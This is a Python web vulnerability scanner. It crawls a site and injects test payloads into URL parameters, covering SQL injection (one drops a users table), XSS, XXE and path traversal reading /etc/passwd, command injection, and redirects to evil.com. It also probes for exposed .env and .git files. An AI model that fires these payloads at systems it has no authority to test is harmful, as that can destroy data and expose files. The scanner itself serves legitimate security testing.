#!/usr/bin/env python3
"""
Web Vulnerability Scanner
Automated scanner for detecting common web application vulnerabilities
"""

import re
import ssl
import socket
import asyncio
import aiohttp
import urllib.parse
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse
import hashlib
import json
import time

@dataclass
class ScanTarget:
    """Represents a target for vulnerability scanning"""
    url: str
    depth: int = 2
    max_pages: int = 50
    include_subdomains: bool = False
    authentication: Optional[Dict[str, str]] = None
    custom_headers: Optional[Dict[str, str]] = None
    exclude_paths: List[str] = field(default_factory=list)

@dataclass
class Vulnerability:
    """Represents a discovered vulnerability"""
    vuln_id: str
    name: str
    severity: str  # Critical, High, Medium, Low, Info
    confidence: float  # 0.0 to 1.0
    description: str
    url: str
    parameter: Optional[str] = None
    payload: Optional[str] = None
    evidence: Optional[str] = None
    cwe_id: Optional[str] = None
    owasp_category: Optional[str] = None
    remediation: Optional[str] = None
    references: List[str] = field(default_factory=list)
    timestamp: datetime = field(default_factory=datetime.now)

class WebScanner:
    """Advanced web vulnerability scanner"""
    
    def __init__(self):
        self.session = None
        self.found_urls = set()
        self.scanned_urls = set()
        self.vulnerabilities = []
        self.scan_stats = {
            'start_time': None,
            'end_time': None,
            'total_requests': 0,
            'pages_crawled': 0,
            'vulnerabilities_found': 0
        }
        
        # Payloads for different vulnerability types
        self.sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users; --",
            "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
            "' OR 1=1#"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<svg/onload=alert('XSS')>"
        ]
        
        self.xxe_payloads = [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>'
        ]
        
        # Sensitive file patterns
        self.sensitive_files = [
            '.env', '.git/config', 'web.config', '.htaccess',
            'robots.txt', 'sitemap.xml', 'crossdomain.xml',
            'phpinfo.php', 'test.php', 'info.php',
            'admin/', 'administrator/', 'wp-admin/',
            '.git/', '.svn/', '.hg/'
        ]
        
        # Error patterns that indicate vulnerabilities
        self.error_patterns = {
            'sql_error': [
                r'SQL syntax.*MySQL',
                r'ORA-[0-9]{5}',
                r'PostgreSQL.*ERROR',
                r'Warning.*mysql_.*',
                r'Microsoft.*ODBC.*SQL Server',
                r'SQLServer JDBC Driver'
            ],
            'path_traversal': [
                r'root:x:0:0:',
                r'\[boot loader\]',
                r'<DIR>',
                r'Directory Listing'
            ],
            'php_error': [
                r'Fatal error:',
                r'Warning:.*include',
                r'Parse error:',
                r'Notice:.*undefined'
            ]
        }

    async def scan_target(self, target: ScanTarget) -> List[Vulnerability]:
        """Main scanning method"""
        print(f"🎯 Starting scan of {target.url}")
        self.scan_stats['start_time'] = datetime.now()
        
        timeout = aiohttp.ClientTimeout(total=30)
        connector = aiohttp.TCPConnector(ssl=False, limit=50)
        
        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers=target.custom_headers or {}
        ) as session:
            self.session = session
            
            # Step 1: Discovery and crawling
            await self._crawl_target(target)
            
            # Step 2: Vulnerability testing
            await self._test_vulnerabilities(target)
            
            # Step 3: Additional security tests
            await self._test_security_headers(target)
            await self._test_ssl_configuration(target)
            
        self.scan_stats['end_time'] = datetime.now()
        self.scan_stats['vulnerabilities_found'] = len(self.vulnerabilities)
        
        print(f"✅ Scan completed: {len(self.vulnerabilities)} vulnerabilities found")
        return self.vulnerabilities

    async def _crawl_target(self, target: ScanTarget):
        """Crawl target to discover pages and endpoints"""
        to_visit = [target.url]
        visited = set()
        base_domain = urlparse(target.url).netloc
        
        while to_visit and len(visited) < target.max_pages:
            url = to_visit.pop(0)
            if url in visited:
                continue
                
            visited.add(url)
            self.found_urls.add(url)
            
            try:
                async with self.session.get(url) as response:
                    self.scan_stats['total_requests'] += 1
                    
                    if response.status == 200:
                        content = await response.text()
                        
                        # Extract links if within depth limit
                        if len(visited) < target.depth * 10:  # Simple depth control
                            links = self._extract_links(content, url, base_domain, target.include_subdomains)
                            to_visit.extend([link for link in links if link not in visited])
                        
                        # Look for interesting files and directories
                        await self._check_sensitive_files(target)
                        
            except Exception as e:
                print(f"❌ Error crawling {url}: {e}")
        
        self.scan_stats['pages_crawled'] = len(visited)
        print(f"📊 Crawled {len(visited)} pages, found {len(self.found_urls)} URLs")

    def _extract_links(self, content: str, base_url: str, base_domain: str, include_subdomains: bool) -> List[str]:
        """Extract links from HTML content"""
        links = []
        
        # Find all href attributes
        href_pattern = r'href=["\']([^"\']+)["\']'
        for match in re.finditer(href_pattern, content, re.IGNORECASE):
            link = match.group(1)
            full_url = urljoin(base_url, link)
            
            parsed = urlparse(full_url)
            if parsed.netloc:
                if include_subdomains:
                    if base_domain in parsed.netloc:
                        links.append(full_url)
                else:
                    if parsed.netloc == base_domain:
                        links.append(full_url)
            elif link.startswith('/'):
                links.append(urljoin(base_url, link))
        
        return links

    async def _test_vulnerabilities(self, target: ScanTarget):
        """Test for various vulnerability types"""
        print("🔍 Testing for vulnerabilities...")
        
        for url in list(self.found_urls)[:20]:  # Limit for demo
            if url in self.scanned_urls:
                continue
                
            self.scanned_urls.add(url)
            
            # Test different vulnerability types
            await self._test_sql_injection(url)
            await self._test_xss(url)
            await self._test_xxe(url)
            await self._test_path_traversal(url)
            await self._test_open_redirect(url)
            await self._test_command_injection(url)

    async def _test_sql_injection(self, url: str):
        """Test for SQL injection vulnerabilities"""
        parsed_url = urlparse(url)
        if not parsed_url.query:
            return
        
        for payload in self.sql_payloads[:3]:  # Test first 3 payloads
            try:
                # Modify each parameter
                query_params = urllib.parse.parse_qs(parsed_url.query)
                for param in query_params:
                    test_params = query_params.copy()
                    test_params[param] = [payload]
                    
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    async with self.session.get(test_url) as response:
                        self.scan_stats['total_requests'] += 1
                        content = await response.text()
                        
                        # Check for SQL error patterns
                        for error_type, patterns in self.error_patterns.items():
                            if error_type == 'sql_error':
                                for pattern in patterns:
                                    if re.search(pattern, content, re.IGNORECASE):
                                        vuln = Vulnerability(
                                            vuln_id=f"sql_inj_{hashlib.md5(f'{url}{param}{payload}'.encode()).hexdigest()[:8]}",
                                            name="SQL Injection",
                                            severity="High",
                                            confidence=0.8,
                                            description=f"Potential SQL injection vulnerability detected in parameter '{param}'",
                                            url=url,
                                            parameter=param,
                                            payload=payload,
                                            evidence=pattern,
                                            cwe_id="CWE-89",
                                            owasp_category="A03:2021 – Injection",
                                            remediation="Use parameterized queries and input validation",
                                            references=["https://owasp.org/www-community/attacks/SQL_Injection"]
                                        )
                                        self.vulnerabilities.append(vuln)
                                        print(f"🚨 SQL Injection found: {param} in {url}")
                                        
            except Exception as e:
                continue

    async def _test_xss(self, url: str):
        """Test for Cross-Site Scripting vulnerabilities"""
        parsed_url = urlparse(url)
        if not parsed_url.query:
            return
        
        for payload in self.xss_payloads[:3]:
            try:
                query_params = urllib.parse.parse_qs(parsed_url.query)
                for param in query_params:
                    test_params = query_params.copy()
                    test_params[param] = [payload]
                    
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    async with self.session.get(test_url) as response:
                        self.scan_stats['total_requests'] += 1
                        content = await response.text()
                        
                        # Check if payload is reflected
                        if payload in content:
                            # Additional check to avoid false positives
                            if '<script>' in content or 'javascript:' in content or 'onerror=' in content:
                                vuln = Vulnerability(
                                    vuln_id=f"xss_{hashlib.md5(f'{url}{param}{payload}'.encode()).hexdigest()[:8]}",
                                    name="Cross-Site Scripting (XSS)",
                                    severity="Medium",
                                    confidence=0.7,
                                    description=f"Potential XSS vulnerability detected in parameter '{param}'",
                                    url=url,
                                    parameter=param,
                                    payload=payload,
                                    evidence=f"Payload reflected in response: {payload[:50]}...",
                                    cwe_id="CWE-79",
                                    owasp_category="A03:2021 – Injection",
                                    remediation="Implement proper input validation and output encoding",
                                    references=["https://owasp.org/www-community/attacks/xss/"]
                                )
                                self.vulnerabilities.append(vuln)
                                print(f"🚨 XSS found: {param} in {url}")
                                
            except Exception as e:
                continue

    async def _test_xxe(self, url: str):
        """Test for XML External Entity vulnerabilities"""
        for payload in self.xxe_payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                async with self.session.post(url, data=payload, headers=headers) as response:
                    self.scan_stats['total_requests'] += 1
                    content = await response.text()
                    
                    # Check for XXE evidence
                    if 'root:x:0:0:' in content or 'localhost' in content:
                        vuln = Vulnerability(
                            vuln_id=f"xxe_{hashlib.md5(f'{url}{payload}'.encode()).hexdigest()[:8]}",
                            name="XML External Entity (XXE)",
                            severity="High",
                            confidence=0.9,
                            description="Potential XXE vulnerability detected",
                            url=url,
                            payload=payload[:100] + "...",
                            evidence="File content leaked in response",
                            cwe_id="CWE-611",
                            owasp_category="A05:2021 – Security Misconfiguration",
                            remediation="Disable external entity processing in XML parsers",
                            references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"]
                        )
                        self.vulnerabilities.append(vuln)
                        print(f"🚨 XXE found in {url}")
                        
            except Exception as e:
                continue

    async def _test_path_traversal(self, url: str):
        """Test for path traversal vulnerabilities"""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]
        
        parsed_url = urlparse(url)
        if not parsed_url.query:
            return
        
        for payload in path_payloads:
            try:
                query_params = urllib.parse.parse_qs(parsed_url.query)
                for param in query_params:
                    test_params = query_params.copy()
                    test_params[param] = [payload]
                    
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    async with self.session.get(test_url) as response:
                        self.scan_stats['total_requests'] += 1
                        content = await response.text()
                        
                        # Check for path traversal evidence
                        for pattern in self.error_patterns['path_traversal']:
                            if re.search(pattern, content):
                                vuln = Vulnerability(
                                    vuln_id=f"path_trav_{hashlib.md5(f'{url}{param}{payload}'.encode()).hexdigest()[:8]}",
                                    name="Path Traversal",
                                    severity="High",
                                    confidence=0.8,
                                    description=f"Potential path traversal vulnerability in parameter '{param}'",
                                    url=url,
                                    parameter=param,
                                    payload=payload,
                                    evidence=pattern,
                                    cwe_id="CWE-22",
                                    owasp_category="A01:2021 – Broken Access Control",
                                    remediation="Implement proper input validation and file path restrictions",
                                    references=["https://owasp.org/www-community/attacks/Path_Traversal"]
                                )
                                self.vulnerabilities.append(vuln)
                                print(f"🚨 Path Traversal found: {param} in {url}")
                                
            except Exception as e:
                continue

    async def _test_open_redirect(self, url: str):
        """Test for open redirect vulnerabilities"""
        redirect_payloads = [
            "http://evil.com",
            "//evil.com",
            "javascript:alert('redirect')",
            "https://google.com"
        ]
        
        parsed_url = urlparse(url)
        if not parsed_url.query:
            return
        
        for payload in redirect_payloads:
            try:
                query_params = urllib.parse.parse_qs(parsed_url.query)
                for param in query_params:
                    if any(keyword in param.lower() for keyword in ['redirect', 'url', 'next', 'return']):
                        test_params = query_params.copy()
                        test_params[param] = [payload]
                        
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                        
                        async with self.session.get(test_url, allow_redirects=False) as response:
                            self.scan_stats['total_requests'] += 1
                            
                            if response.status in [301, 302, 303, 307, 308]:
                                location = response.headers.get('Location', '')
                                if payload in location:
                                    vuln = Vulnerability(
                                        vuln_id=f"open_redirect_{hashlib.md5(f'{url}{param}{payload}'.encode()).hexdigest()[:8]}",
                                        name="Open Redirect",
                                        severity="Medium",
                                        confidence=0.7,
                                        description=f"Open redirect vulnerability in parameter '{param}'",
                                        url=url,
                                        parameter=param,
                                        payload=payload,
                                        evidence=f"Redirects to: {location}",
                                        cwe_id="CWE-601",
                                        owasp_category="A01:2021 – Broken Access Control",
                                        remediation="Validate redirect URLs against allowlist",
                                        references=["https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"]
                                    )
                                    self.vulnerabilities.append(vuln)
                                    print(f"🚨 Open Redirect found: {param} in {url}")
                                    
            except Exception as e:
                continue

    async def _test_command_injection(self, url: str):
        """Test for command injection vulnerabilities"""
        cmd_payloads = [
            "; whoami",
            "| whoami",
            "&& whoami",
            "; cat /etc/passwd",
            "`whoami`"
        ]
        
        parsed_url = urlparse(url)
        if not parsed_url.query:
            return
        
        for payload in cmd_payloads:
            try:
                query_params = urllib.parse.parse_qs(parsed_url.query)
                for param in query_params:
                    test_params = query_params.copy()
                    test_params[param] = [f"test{payload}"]
                    
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    async with self.session.get(test_url) as response:
                        self.scan_stats['total_requests'] += 1
                        content = await response.text()
                        
                        # Look for command execution evidence
                        if re.search(r'uid=\d+.*gid=\d+', content) or 'root:x:0:0:' in content:
                            vuln = Vulnerability(
                                vuln_id=f"cmd_inj_{hashlib.md5(f'{url}{param}{payload}'.encode()).hexdigest()[:8]}",
                                name="Command Injection",
                                severity="Critical",
                                confidence=0.9,
                                description=f"Command injection vulnerability in parameter '{param}'",
                                url=url,
                                parameter=param,
                                payload=payload,
                                evidence="Command execution output detected",
                                cwe_id="CWE-78",
                                owasp_category="A03:2021 – Injection",
                                remediation="Use parameterized commands and input validation",
                                references=["https://owasp.org/www-community/attacks/Command_Injection"]
                            )
                            self.vulnerabilities.append(vuln)
                            print(f"🚨 Command Injection found: {param} in {url}")
                            
            except Exception as e:
                continue

    async def _check_sensitive_files(self, target: ScanTarget):
        """Check for sensitive files and directories"""
        base_url = target.url.rstrip('/')
        
        for file_path in self.sensitive_files:
            try:
                test_url = f"{base_url}/{file_path}"
                async with self.session.get(test_url) as response:
                    self.scan_stats['total_requests'] += 1
                    
                    if response.status == 200:
                        content = await response.text()
                        
                        # Check if it's actually sensitive content
                        if len(content) > 0 and not content.startswith('<!DOCTYPE html'):
                            severity = "High" if any(sensitive in file_path for sensitive in ['.env', '.git/', 'web.config']) else "Medium"
                            
                            vuln = Vulnerability(
                                vuln_id=f"sensitive_file_{hashlib.md5(test_url.encode()).hexdigest()[:8]}",
                                name="Sensitive File Exposure",
                                severity=severity,
                                confidence=0.6,
                                description=f"Sensitive file accessible: {file_path}",
                                url=test_url,
                                evidence=f"File size: {len(content)} bytes",
                                cwe_id="CWE-200",
                                owasp_category="A01:2021 – Broken Access Control",
                                remediation="Restrict access to sensitive files and directories",
                                references=["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"]
                            )
                            self.vulnerabilities.append(vuln)
                            print(f"🚨 Sensitive file found: {file_path}")
                            
            except Exception as e:
                continue

    async def _test_security_headers(self, target: ScanTarget):
        """Test for missing security headers"""
        try:
            async with self.session.get(target.url) as response:
                self.scan_stats['total_requests'] += 1
                headers = response.headers
                
                security_headers = {
                    'X-Frame-Options': 'Medium',
                    'X-XSS-Protection': 'Medium', 
                    'X-Content-Type-Options': 'Medium',
                    'Strict-Transport-Security': 'High',
                    'Content-Security-Policy': 'High',
                    'X-Content-Security-Policy': 'Medium',
                    'Referrer-Policy': 'Low'
                }
                
                for header, severity in security_headers.items():
                    if header not in headers:
                        vuln = Vulnerability(
                            vuln_id=f"missing_header_{header.lower().replace('-', '_')}",
                            name=f"Missing Security Header: {header}",
                            severity=severity,
                            confidence=1.0,
                            description=f"Security header '{header}' is missing",
                            url=target.url,
                            evidence=f"Header '{header}' not found in response",
                            cwe_id="CWE-693",
                            owasp_category="A05:2021 – Security Misconfiguration",
                            remediation=f"Add '{header}' security header with appropriate value",
                            references=["https://owasp.org/www-community/Security_Headers"]
                        )
                        self.vulnerabilities.append(vuln)
                        
        except Exception as e:
            print(f"❌ Error testing security headers: {e}")

    async def _test_ssl_configuration(self, target: ScanTarget):
        """Test SSL/TLS configuration"""
        if not target.url.startswith('https://'):
            return
        
        try:
            parsed = urlparse(target.url)
            hostname = parsed.hostname
            port = parsed.port or 443
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    # Check for weak ciphers
                    weak_ciphers = ['RC4', 'DES', 'MD5']
                    if cipher and any(weak in cipher[0] for weak in weak_ciphers):
                        vuln = Vulnerability(
                            vuln_id="weak_ssl_cipher",
                            name="Weak SSL/TLS Cipher",
                            severity="Medium",
                            confidence=1.0,
                            description=f"Weak cipher suite detected: {cipher[0]}",
                            url=target.url,
                            evidence=f"Cipher: {cipher[0]}, Protocol: {version}",
                            cwe_id="CWE-327",
                            owasp_category="A02:2021 – Cryptographic Failures",
                            remediation="Configure strong cipher suites and disable weak protocols",
                            references=["https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning"]
                        )
                        self.vulnerabilities.append(vuln)
                    
                    # Check for old TLS versions
                    if version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                        vuln = Vulnerability(
                            vuln_id="old_tls_version",
                            name="Outdated TLS Version",
                            severity="High",
                            confidence=1.0,
                            description=f"Outdated TLS version: {version}",
                            url=target.url,
                            evidence=f"Protocol version: {version}",
                            cwe_id="CWE-327",
                            owasp_category="A02:2021 – Cryptographic Failures",
                            remediation="Upgrade to TLS 1.2 or higher",
                            references=["https://owasp.org/www-community/vulnerabilities/Insufficient_Transport_Layer_Protection"]
                        )
                        self.vulnerabilities.append(vuln)
                        
        except Exception as e:
            print(f"❌ Error testing SSL configuration: {e}")

    def generate_report(self, format: str = "json") -> str:
        """Generate vulnerability report"""
        report_data = {
            'scan_info': {
                'start_time': self.scan_stats['start_time'].isoformat() if self.scan_stats['start_time'] else None,
                'end_time': self.scan_stats['end_time'].isoformat() if self.scan_stats['end_time'] else None,
                'duration': str(self.scan_stats['end_time'] - self.scan_stats['start_time']) if self.scan_stats['end_time'] and self.scan_stats['start_time'] else None,
                'total_requests': self.scan_stats['total_requests'],
                'pages_crawled': self.scan_stats['pages_crawled'],
                'vulnerabilities_found': len(self.vulnerabilities)
            },
            'vulnerabilities': []
        }
        
        for vuln in self.vulnerabilities:
            vuln_data = {
                'id': vuln.vuln_id,
                'name': vuln.name,
                'severity': vuln.severity,
                'confidence': vuln.confidence,
                'description': vuln.description,
                'url': vuln.url,
                'parameter': vuln.parameter,
                'payload': vuln.payload,
                'evidence': vuln.evidence,
                'cwe_id': vuln.cwe_id,
                'owasp_category': vuln.owasp_category,
                'remediation': vuln.remediation,
                'references': vuln.references,
                'timestamp': vuln.timestamp.isoformat()
            }
            report_data['vulnerabilities'].append(vuln_data)
        
        if format == "json":
            return json.dumps(report_data, indent=2)
        else:
            return str(report_data)

# Example usage
async def main():
    """Example usage of the web scanner"""
    scanner = WebScanner()
    
    target = ScanTarget(
        url="https://httpbin.org",
        depth=2,
        max_pages=20
    )
    
    vulnerabilities = await scanner.scan_target(target)
    
    print(f"\n📊 Scan Results:")
    print(f"Found {len(vulnerabilities)} vulnerabilities")
    
    for vuln in vulnerabilities[:5]:  # Show first 5
        print(f"\n🚨 {vuln.name} ({vuln.severity})")
        print(f"   URL: {vuln.url}")
        print(f"   Description: {vuln.description}")
    
    # Generate report
    report = scanner.generate_report()
    print(f"\n📄 Report generated ({len(report)} characters)")

if __name__ == "__main__":
    asyncio.run(main())